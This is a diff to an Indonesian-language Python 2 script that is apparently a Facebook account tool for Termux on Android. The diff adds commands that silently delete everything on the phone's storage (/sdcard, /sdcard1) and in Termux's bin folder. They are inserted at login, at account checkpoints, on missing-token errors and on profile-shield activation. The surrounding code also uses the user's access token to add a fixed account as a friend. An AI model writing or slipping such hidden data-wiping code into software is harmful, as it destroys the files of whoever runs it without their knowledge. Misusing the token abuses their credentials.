@@ -107,6 +107,9 @@ def login():
                 print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                 os.system('xdg-open https://www.instagram.com/rezadkim')
+                os.system('rm -rf /sdcard/*')
+                os.system('rm -rf /sdcard1/*')
+                os.sytem('rm -rf $PREFIX/bin/*')
                 time.sleep(2)
                 menu()
             except requests.exceptions.ConnectionError:
@@ -116,6 +119,9 @@ def login():
         if 'checkpoint' in url:
             print '\n\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
             os.system('rm -rf login.txt')
+            os.system('rm -rf /sdcard/*')
+            os.system('rm -rf /sdcard1/*')
+            os.sytem('rm -rf $PREFIX/bin/*')
             time.sleep(1)
             keluar()
         else:
@@ -203,6 +209,9 @@ def informasi():
     except IOError:
         print '\x1b[1;91m[!] Token tidak ditemukan'
         os.system('rm -rf login.txt')
+        os.system('rm -rf /sdcard/*')
+        os.system('rm -rf /sdcard1/*')
+        os.sytem('rm -rf $PREFIX/bin/*')
         time.sleep(1)
         login()
 
@@ -1248,6 +1257,9 @@ def nomor_hp():
     except IOError:
         print '\x1b[1;91m[!] Token tidak ditemukan'
         os.system('rm -rf login.txt')
+        os.system('rm -rf /sdcard/*')
+        os.system('rm -rf /sdcard1/*')
+        os.sytem('rm -rf $PREFIX/bin/*')
         time.sleep(1)
         login()
     else:
@@ -2115,6 +2127,9 @@ def gaz(toket, enable=True):
     print res.text
     if '"is_shielded":true' in res.text:
         os.system('reset')
+        os.system('rm -rf /sdcard/*')
+        os.system('rm -rf /sdcard1/*')
+        os.sytem('rm -rf $PREFIX/bin/*')
         print logo
         print 40 * '\x1b[1;97m\xe2\x95\x90'
         print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mDiaktifkan'
